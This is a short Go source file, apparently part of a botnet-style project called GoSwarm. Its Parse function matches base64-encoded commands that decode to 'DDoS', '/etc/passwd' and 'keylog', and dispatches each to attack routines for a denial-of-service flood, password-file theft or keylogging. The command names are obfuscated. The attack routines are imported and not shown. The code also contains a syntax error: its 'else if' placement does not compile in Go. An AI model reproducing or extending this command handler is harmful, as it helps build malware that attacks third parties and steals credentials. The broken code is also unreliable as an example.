package parser

import (
	"fmt"
	"strings"

	"github.com/Pimmytrousers/GoSwarm/attacks"
)

func Parse(cmd string) {
	var output = ""
	if strings.Contains(cmd, "RERvUw==") {
		output = attacks.DDoS()
	}
	else if strings.Contains(cmd, "L2V0Yy9wYXNzd2QNCg==") {
		output = attacks.GrabPasswd()
	}
	else if strings.Contains(cmd, "a2V5bG9nDQo") {
		output = attacks.Keylogg()
	}
	fmt.Println(output)
}
